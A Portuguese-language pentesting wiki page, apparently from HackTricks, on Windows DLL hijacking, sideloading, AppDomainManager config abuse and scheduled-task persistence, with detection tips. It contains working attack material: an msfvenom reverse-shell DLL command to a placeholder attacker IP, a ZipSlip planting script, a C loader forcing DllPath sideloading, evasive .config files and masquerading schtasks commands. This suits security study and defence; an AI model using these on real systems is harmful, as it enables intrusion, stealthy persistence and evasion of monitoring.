# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações básicas

DLL Hijacking consiste em manipular um aplicativo confiável para que ele carregue uma DLL maliciosa. Esse termo abrange várias táticas, como **DLL Spoofing, Injection e Side-Loading**. É usado principalmente para execução de código e persistência e, com menos frequência, para escalada de privilégios. Embora o foco aqui seja a escalada, o método de hijacking permanece o mesmo, independentemente do objetivo.

### Técnicas comuns

Há vários métodos de DLL hijacking, e a eficácia de cada um depende da estratégia de carregamento de DLLs do aplicativo:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Substituir uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de pesquisa anterior ao da DLL legítima, explorando o padrão de pesquisa do aplicativo.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para que um aplicativo a carregue, supondo que ela seja uma DLL necessária, mas inexistente.
4. **DLL Redirection**: Modificar parâmetros de pesquisa, como `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo à DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma versão maliciosa no diretório WinSxS, método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com o aplicativo copiado, de forma semelhante às técnicas de Binary Proxy Execution.

Um aplicativo também pode implementar seu **próprio carregador de DLLs**. Um processo privilegiado pode enumerar um diretório filho, como `Libraries` ou `Plugins`, e passar uma DLL selecionada para um auxiliar, independentemente da ordem normal de pesquisa de DLLs do Windows. Se outra conta puder criar arquivos nesse diretório específico, considere isso um indício a investigar: confirme a identidade do processo, a ACL efetiva do diretório, a regra de seleção de arquivos e se há uma operação de carregamento alcançável. Um diretório gravável ao lado de um executável não comprova que o processo carrega DLLs dele.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

O side-loading clássico mantém o PE confiável inalterado e vence a resolução de nomes de DLL. **Import grafting**, em vez disso, modifica um PE já carregado pelo programa confiável. O atacante adiciona um descritor de importação e as entradas de pesquisa/IAT associadas para uma DLL controlada pelo atacante. Quando o Windows resolve recursivamente essa dependência, ele mapeia a DLL adicionada e executa seu código de inicialização dentro do processo, que, de outra forma, seria legítimo. Essa é uma modificação de um PE em disco, não a mesma operação que substituir um ponteiro de função IAT ativo por um hook em tempo de execução.<sup>[[31]](#references)[[32]](#references)</sup>

O PE modificado pode ser uma DLL intermediária do fornecedor, em vez do executável iniciado pelo usuário ou pelo Agendador de Tarefas. Uma cadeia reutilizável é:<sup>[[32]](#references)</sup>

1. Copie o executável legítimo e suas dependências para um diretório controlado pelo atacante.
2. Corrija as estruturas de importação de uma das dependências para que ela faça referência à DLL maliciosa, mantendo as exportações esperadas e o comportamento normal da dependência.
3. Configure uma execução automática ou uma tarefa agendada para iniciar o executável legítimo. O carregador mapeia a dependência alterada e, em seguida, a DLL recém-importada. Consulte [Escalada de privilégios com Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) para enumerar tarefas.
4. Não coloque operações demoradas em `DllMain`; o carregador observado criou uma thread de trabalho e continuou nela a descriptografia em etapas.

Isso difere de um comprometimento da cadeia de suprimentos do fornecedor quando o pacote do fornecedor está limpo e a modificação da importação ocorre após a instalação. Faça a triagem de todos os módulos no diretório preparado, não apenas do EXE hospedeiro: compare as listas de importação e os hashes das dependências com uma instalação confiável, verifique as assinaturas e investigue binários do fornecedor iniciados a partir de locais graváveis inesperados, como `C:\ProgramData`. Uma tarefa agendada que aponta para uma cópia de um relatório de falhas ou atualizador nesse diretório é um ponto de investigação especialmente útil.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

O DLL sideloading clássico não é a única forma de fazer um processo confiável do **.NET Framework** carregar código do atacante. Se o executável alvo for um aplicativo **gerenciado**, o CLR também consulta um **arquivo de configuração do aplicativo** com o nome do executável (por exemplo, `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** personalizado. Se a configuração apontar para um assembly controlado pelo atacante, localizado ao lado do EXE, o CLR o carregará **antes do fluxo normal de execução do aplicativo** e ele será executado dentro do processo confiável.<sup>[[24]](#references)</sup>

De acordo com o esquema de configuração do .NET Framework da Microsoft, `<appDomainManagerAssembly>` e `<appDomainManagerType>` precisam estar presentes para que o gerenciador personalizado seja usado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuração mínima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gerenciador mínimo:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notas práticas:
- Esta é uma técnica **específica do .NET Framework**. Ela depende da análise da configuração do CLR, não da ordem de pesquisa de DLL do Win32.
- O host precisa ser realmente um **EXE gerenciado**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe` ou verifique o **CLR Runtime Header** nos metadados PE.
- O nome do arquivo de configuração precisa corresponder exatamente ao nome do executável (`<binary>.config`) e geralmente fica **ao lado do EXE**.
- Isso é útil com **binários assinados da Microsoft/de fornecedores**, porque o EXE confiável permanece intacto enquanto o assembly gerenciado malicioso é executado no processo.
- Se você já tiver um diretório de instalação/atualização com permissão de escrita, o hijacking de AppDomainManager pode ser usado como **primeiro estágio**, seguido por DLL sideloading clássico ou carregamento reflexivo em estágios posteriores.

### Tipo AppDomainManager assinado como gadget de arquivo de configuração

O hijacking de configuração do AppDomainManager descrito acima aponta para um assembly do atacante. Outra possibilidade no .NET Framework usa um **assembly assinado**, colocado ao lado do host ou resolvível de outra forma, cujo tipo de manager lê dados sidecar controlados pelo atacante. O atacante ainda precisa controlar o arquivo `.exe.config` adjacente ao host gerenciado e os arquivos secundários; a assinatura do assembly selecionado não torna segura sua entrada de configuração. O mecanismo de configuração é um comportamento estabelecido do AppDomainManager, enquanto o encadeamento de tipos assinados descrito abaixo foi observado na análise do NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Nesse encadeamento, a configuração seleciona `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` de `Microsoft.HostIntegration.Connectors`. Sua inicialização procura `fabric.config` no diretório do aplicativo. Uma entrada `customType` nomeia `System.Resources.ResXResourceSet` e fornece `Resources.resx` como argumento do construtor, alcançando um parser de recursos sem distribuir uma DLL de manager criada pelo atacante. Isso requer que o assembly assinado relacionado ao AppFabric e as classes de framework nomeadas sejam resolvidos no alvo; não é uma propriedade universal de qualquer EXE gerenciado.<sup>[[35]](#references)</sup> Um AppDomainManager configurado também exige um aplicativo de confiança total; caso contrário, o CLR lança `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

O conteúdo de `Resources.resx` é o sink de desserialização, não apenas um arquivo de dados; consulte [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Na etapa relatada, o carregador XAML também derivava sua chave AES do hash SHA-256 da **linha de comando completa do host em letras minúsculas** e usava os primeiros 16 bytes do blob decodificado como IV. Portanto, reproduzir os arquivos com uma linha de comando diferente faz a descriptografia falhar antes que o próximo XAML seja carregado.<sup>[[35]](#references)</sup>

### AppDomainManager como downloader + bootstrap de tarefa agendada

Um padrão prático de intrusão é combinar o EXE gerenciado confiável com um `*.config` malicioso e uma DLL AppDomainManager maliciosa que atua apenas como um **bootstrapper pequeno**:<sup>[[25]](#references)</sup>

1. O usuário inicia um instalador ou atualizador .NET assinado de um local plausível, como `%USERPROFILE%\Downloads`.
2. O arquivo de configuração adjacente faz o CLR carregar o assembly do atacante **antes do início da lógica legítima do aplicativo**.
3. O manager malicioso realiza uma **verificação de caminho** (por exemplo, só continua se o EXE host estiver sendo executado de `Downloads` e só permite que o segundo estágio seja executado de `%LOCALAPPDATA%`).
4. Se a verificação passar, ele baixa o payload real para um caminho gravável pelo usuário, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistência com uma tarefa agendada.

Por que essa variante é importante:
- O EXE host assinado permanece inalterado, então uma triagem que verifica apenas o hash do binário principal pode não detectar o comprometimento.
- **Anti-análise baseada em caminho** simples é comum: mover o conjunto ZIP/EXE/DLL para Desktop, Temp ou um caminho de sandbox pode interromper intencionalmente a cadeia.
- A DLL AppDomainManager de primeiro estágio pode permanecer pequena e discreta enquanto o implante real é obtido posteriormente.

Exemplo mínimo de persistência frequentemente visto com esse padrão:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Observações:
- ` /rl highest` significa **o nível mais alto disponível** para aquele usuário/sessão; por si só, não garante uma escalada para SYSTEM.
- Essa técnica costuma ser melhor categorizada como **execução/persistência por abuso de configuração .NET** do que como hijacking clássico da ordem de busca de DLLs ausentes, embora operadores frequentemente encadeiem ambas.

Indicadores para detecção:
- Executáveis .NET assinados iniciados de **caminhos de extração de ZIP**, `Downloads`, `%TEMP%` ou outras pastas graváveis pelo usuário, com um `<exe>.config` **no mesmo diretório**.
- Novas tarefas agendadas cuja ação aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads` e cujos nomes imitam atualizadores de navegadores ou fornecedores.
- Processos bootstrap gerenciados de curta duração que baixam imediatamente outro EXE e, em seguida, iniciam `schtasks.exe`.
- Amostras que encerram a execução antecipadamente, a menos que o caminho do executável corresponda a um diretório esperado do perfil do usuário.

### Hijacking de uma tarefa agendada existente para reiniciar a cadeia de sideload

Para persistência, não procure apenas **criações de novas tarefas**. Alguns grupos de intrusão aguardam até que um instalador legítimo crie uma **tarefa normal de atualização** e, então, **reescrevem a ação da tarefa** para que o nome, o autor e o gatilho existentes continuem familiares aos defensores.

Fluxo de trabalho reutilizável:
1. Instale/execute o software legítimo e identifique a tarefa que ele normalmente cria.
2. Exporte o XML da tarefa e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Substitua apenas a ação para que a tarefa inicie seu **EXE host confiável** de um diretório de preparação gravável pelo usuário, que então faz side-load ou carrega o payload real via AppDomain.
4. Registre novamente o mesmo nome de tarefa em vez de criar um artefato de persistência obviamente novo.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Por que é mais furtivo:
- O nome da tarefa ainda pode parecer legítimo (por exemplo, um atualizador de fornecedor).
- O **serviço do Agendador de Tarefas** a inicia, então a validação do processo pai/ancestral geralmente vê a cadeia de agendamento esperada em vez de `explorer.exe`.
- Equipes de DFIR que procuram apenas **novos nomes de tarefas** podem não detectar uma tarefa cujo registro já existia, mas cuja ação agora aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou outro caminho controlado pelo atacante.

Pontos de investigação rápidos:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare o XML em `C:\Windows\System32\Tasks\*` e os metadados em `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` com uma baseline.
- Gere um alerta quando uma **tarefa de atualização com aparência de ser de um fornecedor** executar de **diretórios graváveis pelo usuário** ou iniciar um EXE .NET com um arquivo `*.config` no mesmo diretório.

> [!TIP]
> Para ver uma cadeia passo a passo que combina staging HTML, configs AES-CTR e implantes .NET com DLL sideloading, consulte o fluxo de trabalho abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Vinculando um estágio side-loaded à linha de comando do serviço

Uma DLL side-loaded pode exigir mais do que o EXE host e o nome da DLL esperados. A Mandiant descreveu um loader que vincula a descriptografia do payload a um argumento da linha de comando e ao nome do executável host.<sup>[[33]](#references)</sup> Em uma cadeia posterior apoiada por serviço, um host legítimo copiado carregou um `mscoree.dll` adjacente, que exportava `LockClrVersion` e só descriptografava seu estágio incorporado após derivar uma chave AES-128 do argumento do serviço e do nome base do executável host. Cada entrada era truncada ou preenchida com NUL até 16 bytes; a chave byte a byte era `argument XOR embedded_key XOR executable_basename`, e então o payload era descriptografado com AES-CBC sem padding. Renomear o host ou iniciá-lo sem o argumento esperado altera a chave e impede a descriptografia desse estágio, mesmo que a DLL ainda seja carregada. Preserve o argumento exato da linha de comando e o nome base ao reproduzir ou analisar essa variante.<sup>[[34]](#references)</sup>

Isso é um **gate de payload aplicado sobre o DLL side-loading comum**, não uma nova regra de ordem de busca de DLLs nem, por si só, uma primitiva de escalonamento de privilégios. O contexto de segurança do serviço determina o nível de privilégio resultante. O fluxo de trabalho de C2 por [issue/arquivo do GitHub](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) documenta separadamente o transporte usado posteriormente.<sup>[[34]](#references)</sup>

## Encontrando DLLs ausentes

A maneira mais comum de encontrar DLLs ausentes em um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do Sysinternals e **definir** os **2 filtros a seguir**:

![Técnicas comuns - Encontrando DLLs ausentes: A maneira mais comum de encontrar DLLs ausentes em um sistema é executar o procmon do Sysinternals e definir os 2 filtros a seguir](<../../../images/image (961).png>)

![Técnicas comuns - Encontrando DLLs ausentes: A maneira mais comum de encontrar DLLs ausentes em um sistema é executar o procmon do Sysinternals e definir os 2 filtros a seguir](<../../../images/image (230).png>)

e exibir apenas a **Atividade do sistema de arquivos**:

![Técnicas comuns - Encontrando DLLs ausentes: e exibir apenas a Atividade do sistema de arquivos](<../../../images/image (153).png>)

Se estiver procurando **DLLs ausentes em geral**, **deixe** isso em execução por alguns **segundos**.\
Se estiver procurando uma **DLL ausente em um executável específico**, defina outro filtro, como **"Process Name" "contains" `<exec name>`**, execute-o e pare de capturar eventos.<sup>[[9]](#references)</sup>

## Explorando DLLs ausentes

Para escalar privilégios, procure uma **DLL que um processo privilegiado tente carregar** de um local em que você possa gravar. Isso pode ocorrer quando você controla um diretório pesquisado antes do diretório que contém a DLL legítima, ou quando a DLL solicitada não existe e você pode gravar em um dos diretórios pesquisados.

### Ordem de busca de DLLs

**Na** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), **você pode encontrar informações sobre como as DLLs são carregadas.**

**Aplicativos Windows** procuram DLLs seguindo um conjunto de **caminhos de busca predefinidos**, em uma sequência específica. O problema de DLL hijacking ocorre quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que seja carregada antes da DLL legítima. Uma forma de evitar isso é garantir que o aplicativo use caminhos absolutos ao referenciar as DLLs necessárias.

Veja abaixo a **ordem de busca de DLLs em sistemas de 32 bits**:

1. O diretório de onde o aplicativo foi carregado.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho desse diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há uma função que obtenha o caminho desse diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho desse diretório.
   1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Observe que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada no cálculo do caminho de busca de DLLs.

Essa é a ordem de busca **padrão** com **SafeDllSearchMode** habilitado. Quando ele está desabilitado, o diretório atual sobe para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Por fim, uma DLL pode ser carregada usando um caminho absoluto em vez do nome. Nesse caso, o Windows procura a própria DLL somente nesse caminho; as dependências solicitadas pelo nome ainda seguem a ordem de busca aplicável.

Há outras formas de alterar a ordem de busca, mas não vou explicá-las aqui.

### Encadeando uma gravação arbitrária de arquivo a um hijack de DLL ausente

**Técnica relacionada:** [alternância de mount point controlada por oplock contra remediação privilegiada](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Use filtros do **ProcMon** (`Process Name` = EXE alvo, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) para coletar os nomes de DLLs que o processo procura, mas não encontra.<sup>[[14]](#references)</sup>
2. Se o binário for executado por um **agendamento/serviço**, colocar uma DLL com um desses nomes no **diretório do aplicativo** (entrada nº 1 na ordem de busca) fará com que ela seja carregada na próxima execução. Em um caso com um scanner .NET, o processo procurava `hostfxr.dll` em `C:\samples\app\` antes de carregar a cópia legítima de `C:\Program Files\dotnet\fxr\...`.
3. Crie uma DLL de payload (por exemplo, um reverse shell) com qualquer exportação: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se sua primitiva for uma **gravação arbitrária no estilo ZipSlip**, crie um ZIP cuja entrada escape do diretório de extração para que a DLL seja colocada na pasta do aplicativo:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Entregue o arquivo compactado na caixa de entrada/compartilhamento monitorado; quando a tarefa agendada iniciar o processo novamente, ele carregará a DLL maliciosa e executará seu código como a conta de serviço.

### Forçando sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar deterministicamente o caminho de pesquisa de DLLs de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas de ntdll. Ao fornecer aqui um diretório controlado pelo atacante, é possível forçar um processo de destino que resolva uma DLL importada pelo nome (sem caminho absoluto e sem usar os sinalizadores de carregamento seguro) a carregar uma DLL maliciosa desse diretório.

Ideia principal
- Crie os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath personalizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker está).
- Crie o processo com RtlCreateUserProcess. Quando o binário de destino resolver uma DLL pelo nome, o loader consultará o DllPath fornecido durante a resolução, permitindo um sideloading confiável mesmo quando a DLL maliciosa não estiver no mesmo diretório que o EXE de destino.

Observações/limitações
- Isso afeta o processo filho que está sendo criado; é diferente de SetDllDirectory, que afeta apenas o processo atual.
- O destino precisa importar ou carregar com LoadLibrary uma DLL pelo nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos codificados não podem ser sequestrados. Exports encaminhados e SxS podem alterar a precedência.

Exemplo mínimo em C (ntdll, strings wide, tratamento de erros simplificado):

<details>
<summary>Exemplo completo em C: forçando DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Exemplo de uso operacional
- Coloque uma xmllite.dll maliciosa (exportando as funções necessárias ou fazendo proxy para a real) no seu diretório DllPath.
- Inicie um binário assinado que, como se sabe, procura xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação usando o DllPath fornecido e faz sideload da sua DLL.

Essa técnica foi observada em uso real para criar cadeias de sideloading em várias etapas: um launcher inicial grava uma DLL auxiliar, que então inicia um binário assinado pela Microsoft e vulnerável a hijacking com um DllPath personalizado para forçar o carregamento da DLL do atacante a partir de um diretório de staging.<sup>[[6]](#references)</sup>


### Hijacking de AppDomainManager do .NET via `.exe.config`

Para alvos do **.NET Framework**, o sideloading pode ocorrer **antes de `Main()`** sem alterar a memória, abusando do arquivo **`.exe.config`** adjacente ao aplicativo. Em vez de depender apenas da ordem de busca de DLL do Win32, o atacante coloca um EXE legítimo do .NET junto de um arquivo de configuração malicioso e de um ou mais assemblies controlados pelo atacante.

Como a cadeia funciona:<sup>[[15]](#references)[[22]](#references)</sup>
1. O EXE host é iniciado e o **CLR lê `<exe>.config`**.
2. O arquivo de configuração define **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`** para que o runtime instancie um `AppDomainManager` controlado pelo atacante.
3. O manager malicioso obtém **execução antes de `Main()`** dentro do processo host confiável.
4. O mesmo arquivo de configuração pode forçar o CLR a resolver primeiro assemblies locais (por exemplo, InitInstall.dll, Updater.dll, uevmonitor.dll) e pode enfraquecer a validação/telemetria do runtime sem patching inline.

Padrão típico de campanhas (o aninhamento exato pode variar conforme a diretiva / versão do CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Por que isso é útil:
- **`<probing privatePath="."/>`** mantém a resolução de assemblies no diretório do aplicativo, transformando a pasta em uma superfície previsível para sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** direcionam a execução para o código do atacante durante a inicialização do CLR, antes de a lógica legítima do aplicativo ser executada.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** pode permitir que um aplicativo de confiança total carregue assemblies não assinados ou adulterados sem falha na validação de strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita redirecionamentos de publisher policy para assemblies mais recentes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** torna a seleção do runtime mais determinística.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** é especialmente interessante porque o **CLR desativa sua própria visibilidade ETW** por meio da configuração, em vez de o implante corrigir `EtwEventWrite` na memória.

Padrão operacional observado em campanhas recentes:
- Estágio 1 solta `setup.exe`, `setup.exe.config` e assemblies locais.
- Estágio 2 os copia para uma pasta **AppData de atualização** convincente, renomeia o host para algo como `update.exe` e o reinicia por meio de uma **tarefa agendada**.
- Estágio 3 verifica o contexto de execução (por exemplo, se o processo pai esperado é `svchost.exe`, iniciado pelo Task Scheduler) antes de carregar a DLL/exportação final do RAT.

Ideias para caça:
- **Executáveis .NET** assinados ou legítimos de outra forma, executados com arquivos **`.config`** adjacentes suspeitos em locais graváveis pelo usuário.
- Arquivos `.config` que contenham **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Tarefas agendadas que reiniciam binários de atualização renomeados a partir de **`%LOCALAPPDATA%`** ou de diretórios específicos do aplicativo, como `\bin\update\`.
- Cadeias de processos pai/filho nas quais uma tarefa agendada inicia um host .NET confiável que carrega imediatamente assemblies que não são do fornecedor a partir do próprio diretório.

#### Exceções à ordem de pesquisa de DLLs na documentação do Windows

A documentação do Windows menciona algumas exceções à ordem padrão de pesquisa de DLLs:

- Quando é encontrado uma **DLL com o mesmo nome de outra já carregada na memória**, o sistema ignora a pesquisa usual. Em vez disso, verifica se há redirecionamento e um manifesto antes de recorrer à DLL já carregada na memória. **Nesse cenário, o sistema não pesquisa a DLL**.
- Se a DLL for reconhecida como uma **DLL conhecida** para a versão atual do Windows, o sistema usará sua versão da DLL conhecida, junto com quaisquer DLLs dependentes, **sem realizar a pesquisa**. A chave do Registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas DLLs conhecidas.
- Se uma **DLL tiver dependências**, a pesquisa dessas DLLs dependentes será feita como se elas fossem especificadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por um caminho completo.

### Escalonando privilégios

**Requisitos**:

- Identificar um processo que opere ou venha a operar com **privilégios diferentes** (movimentação horizontal ou lateral) e ao qual **falte uma DLL**.
- Garantir **acesso de gravação** a qualquer **diretório** no qual a **DLL** será **pesquisada**. Esse local pode ser o diretório do executável ou um diretório no caminho do sistema.

Esses pré-requisitos não são comuns por padrão: executáveis privilegiados geralmente não têm dependências de DLL ausentes, e usuários padrão normalmente não podem gravar em diretórios do caminho de pesquisa do sistema. Ainda assim, ambientes mal configurados podem apresentar ambas as condições.\
Se os requisitos forem atendidos, confira o projeto [UACME](https://github.com/hfiref0x/UACME). Embora seu principal objetivo seja contornar o UAC, ele contém PoCs de DLL hijacking para versões específicas do Windows que muitas vezes podem ser adaptadas ao diretório gravável encontrado.

Observe que você pode **verificar suas permissões em uma pasta** com:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **verifique as permissões de todas as pastas dentro de PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Você também pode verificar as importações de um executável e as exportações de uma DLL com:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Para um guia completo sobre como **abusar de DLL Hijacking para escalar privilégios** com permissões de gravação em uma **pasta do System Path**, confira:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

